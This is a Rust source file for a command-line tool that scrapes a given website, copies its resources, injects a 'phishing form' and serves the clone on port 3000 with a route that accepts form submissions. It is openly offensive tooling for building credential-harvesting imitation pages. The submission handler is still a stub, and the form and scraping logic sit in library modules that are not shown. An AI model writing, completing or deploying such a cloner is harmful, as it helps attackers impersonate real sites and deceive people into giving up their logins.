// Imports
use axum::{
    Router,
    extract::Path,
    http::StatusCode,
    response::{Html, IntoResponse},
    routing::{get, post},
};
use clap::Parser;
use tower_http::{services::ServeDir, trace::TraceLayer};

// Local Library Imports
use lib::{
    forms::add_phishing_form, resources::copy_resources::copy_resources, scraping::scrape_website,
};

//Define the CLI arguments to parse
#[derive(Parser, Debug, Clone)]
struct Args {
    #[arg(short, long)]
    url: String,
    #[arg(short, long)]
    target_dir: String,
    #[arg(short, long, default_value = "site1")]
    site_id: String,
}

//Main async function with 10 workers
#[tokio::main(flavor = "multi_thread", worker_threads = 10)]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Parse the arguments
    let args = Args::parse();

    // Create the target directory
    tokio::fs::create_dir_all(&args.target_dir).await?;

    // Scrape the URL and assign the document and client
    let scraping_result = scrape_website(&args.url).await?;
    let document = scraping_result.document.clone();
    let client = scraping_result.client;

    //Create the phishing form and copy resources (images, etc)
    add_phishing_form::add_phishing_form(&document, &args.target_dir, &args.site_id).await?;
    copy_resources(&document, &client, &args.url, &args.target_dir).await?;

    // Define the app router
    let app = Router::new()
        .route(
            "/",
            get({
                let target_dir = args.target_dir.clone();
                move || async move { index_get(target_dir.clone()).await }
            }),
        )
        .route("/handle_submit/{site_id}", post(handle_submit))
        .fallback_service(ServeDir::new(&args.target_dir))
        .layer(TraceLayer::new_for_http());

    // Set a listener at local port 3000
    let listener = tokio::net::TcpListener::bind("0.0.0.0:3000").await?;

    // Let the user know that the page is live
    println!("🚀 Server: http://localhost:3000");
    println!("📁 Dir: {}", args.target_dir);
    println!("🆔 Site: {}", args.site_id);

    axum::serve(listener, app).await?;
    Ok(())
}

// Get the index page
async fn index_get(target_dir: String) -> Result<Html<String>, StatusCode> {
    let html = tokio::fs::read_to_string(format!("{}/index.html", target_dir))
        .await
        .map_err(|_| StatusCode::NOT_FOUND)?;
    Ok(Html(html))
}

// Handle the form's submits.
async fn handle_submit(Path(site_id): Path<String>) -> impl IntoResponse {
    println!("Input from site_id: {}", site_id);

    // TODO: Implement a redirect or display any page
    StatusCode::OK
}
